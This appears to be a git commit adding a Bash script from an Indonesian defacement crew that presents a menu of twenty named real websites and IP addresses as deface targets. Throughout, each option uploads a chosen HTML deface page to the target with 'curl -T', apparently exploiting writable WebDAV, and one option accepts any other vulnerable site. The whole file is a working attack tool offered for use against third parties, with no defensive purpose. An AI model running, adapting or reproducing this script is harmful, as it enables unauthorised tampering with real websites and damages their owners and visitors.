0310bc5fea5bfa454a03b250ce92d83738d94237
Rusmana <39558261+Rusmana1@users.noreply.github.com>
2018-06-24 12:26:05 +0700

    Add files via upload

---
+++ cwj.sh
@@ -0,0 +1,334 @@
+#!/usr/bin/bash
+#!/usr/bin/entot
+#Salam Anak Bangsa
+#Berkarya Adalah Hoby kami
+clear
+echo
+echo -e '\e[1;32m'
+figlet -f big CWJ TOOLS
+echo -e '\e[1;34m' '[+]=======================================================[+]'
+echo -e '\e[1;35m' "Creator =-=[ Mr_t3v!0n ]=-"
+echo -e '\e[1;31m' "Team = -=[ Cyber West Java ]=-"
+echo -e '\e[1;33m' " Thanks To.: 
+| Mr_trv!0n | AMRiezZ | Mr.R | Mr.1C3CR34M | AR-NoL!m!t3d | And ALL MEMBER "
+echo -e '\e[1;31m' '[+]=======================================================[+]'
+echo -e '\e[1;37m' " Thanks To = Allah SWT Dan Alam Anak Bangsa"
+echo -e '\e[1;37m' " Anak Muda Berkarya Bukan Bergaya"
+echo -e '\e[1;34m' '[+]=======================================================[+]'
+echo -e '\e[1;31m' " W3lcome T0 T00LS Cyber West Java"
+echo -e '\e[1;32m' "========>>Pilih Website Yang Ingin Di DEFACE<<========"
+echo -e '\e[1;34m' "[01] http://www.rabachino.com"
+echo -e '\e[1;31m' "[02] http://uniplaces.co.za"
+echo -e '\e[1;34m' "[03] http://ivplay.co.za"
+echo -e '\e[1;31m' "[04] http://zoocentral.co.za"
+echo -e '\e[1;34m' "[05] http://www.zgxxk.net/"
+echo -e '\e[1;31m' "[06] http://www.567888.pw/"
+echo -e '\e[1;34m' "[07] http://www.danahias.at/"
+echo -e '\e[1;31m' "[08] http://www.wsdscu.org/"
+echo -e '\e[1;34m' "[09] http://bestilling.udir.no/"
+echo -e '\e[1;31m' "[10] http://scm.icams.co.kr/"
+echo -e '\e[1;34m' "[11] http://158.36.153.158/"
+echo -e '\e[1;31m' "[12] http://tirupurjobs.net/"
+echo -e '\e[1;34m' "[13] http://apparelworld.org/"
+echo -e '\e[1;31m' "[14] http://gma2t.wlannet.net/"
+echo -e '\e[1;34m' "[15] http://praso.wlannet.net/"
+echo -e '\e[1;31m' "[16] http://smsget.zayhi.com/"
+echo -e '\e[1;34m' "[17] http://tctnh.wlannet.net/"
+echo -e '\e[1;31m' "[18] http://webphone.zayhi.com/"
+echo -e '\e[1;34m' "[19] http://wop.zayhi.com/"
+echo -e '\e[1;31m' "[20] http://isu.allbest.org/"
+echo -e '\e[1;34m' "=====>>Punya Target Sendiri?<<====="
+echo -e '\e[1;33m' "[21] Punya Target?"
+echo -e '\e[1;34m' "[00] Quit"
+echo -e '\e[1;36m' "Note : -=[Simpan Script di luar sd card  jangan di simpan di dalam folder]=-"
+read -p "Pilih Opsinya >>>> : " cwj;
+if [ $cwj = 01 ] || [ $cwj = 1 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://www.rabachino.com
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.rabachino.com/$script"
+exit
+fi
+if [ $cwj = 02 ] || [ $cwj = 2 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://uniplaces.co.za
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://uniplaces.co.za/$script"
+exit
+fi
+if [ $cwj = 03 ] || [ $cwj = 3 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://ivplay.co.za
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://ivplay.co.za/$script"
+exit
+fi
+if [ $cwj = 04 ] || [ $cwj = 4 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://zoocentral.co.za
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://zoocentral.co.za/$script"
+exit
+fi
+if [ $cwj = 05 ] || [ $cwj = 5 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.zgxxk.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.zgxxk.net/$script"
+exit
+fi
+if [ $cwj = 06 ] || [ $cwj = 6 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.567888.pw/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.567888.pw/$script"
+exit
+fi
+if [ $cwj = 07 ] || [ $cwj = 7 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.danahias.at/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.danahias.at/$script"
+exit
+fi
+if [ $cwj = 08 ] || [ $cwj = 8 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.wsdscu.org/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.wsdscu.org/$script"
+exit
+fi
+if [ $cwj = 09 ] || [ $cwj = 9 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://bestilling.udir.no/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://bestilling.udir.no/$script"
+exit
+fi
+if [ $cwj = 10 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://scm.icams.co.kr/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://scm.icams.co.kr/$script"
+exit
+fi
+if [ $cwj = 11 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://158.36.153.158/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://158.36.153.158/$script"
+exit
+fi
+if [ $cwj = 12 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://tirupurjobs.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://tirupurjobs.net/$script"
+exit
+fi
+if [ $cwj = 13 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.apparelworld.org/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.apparelworld.org/$script"
+exit
+fi
+if [ $cwj = 14 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://www.tirupurjobs.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://www.tirupurjobs.net/$script"
+exit
+fi
+if [ $cwj = 15 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://apparelworld.org/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://apparelworld.org/$script"
+exit
+fi
+if [ $cwj = 16 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING....."
+curl -T /sdcard/$script http://gma2t.wlannet.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://gma2t.wlannet.net/$script"
+exit
+fi
+if [ $cwj = 17 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://praso.wlannet.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://praso.wlannet.net/$script"
+exit
+fi
+if [ $cwj = 18 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://smsget.zayhi.com/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://smsget.zayhi.com/$script"
+exit
+fi
+if [ $cwj = 19 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING...."
+curl -T /sdcard/$script http://tctnh.wlannet.net/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://tctnh.wlannet.net/$script"
+exit
+fi
+if [ $cwj = 20 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;34m' "Masukan Nama Script Deface dngan format html"
+echo -n "script : "
+read script ;
+echo -e '\e[1;31m' "LOADING..."
+curl -T /sdcard/$script http://webphone.zayhi.com/
+echo -e '\e[1;31m' "=====[DONE]====="
+echo -e '\e[1;31m' "Cek = http://webphone.zayhi.com/$script"
+exit
+fi
+if [ $cwj = 21 ]
+then
+clear
+figlet -f lean Mr_tr3v!0n
+echo -e '\e[1;33m' "Masukan Website vuln webdav target"
+echo -n "Website : "
+read website ;
+echo -e '\e[1;33m' " Masukan Nama Script"
+echo -n "Script : "
+read script ;
+echo -e '\e[1;31m' "Loading...."
+curl -T /sdcard/$script $website
+exit
+fi
+if [ $cwj = 22 ]
+then
+clear
+python2 htmd.py
+fi
+if [ $cwj = 23 ]
+then
+clear
+python2 ScDeface.py
+fi
+
+if [ $cwj = 00 ] || [ $cwj = 0 ]
+then
+clear
+echo -e '\e[1;34m' "Bye-Bye :)"
+fi
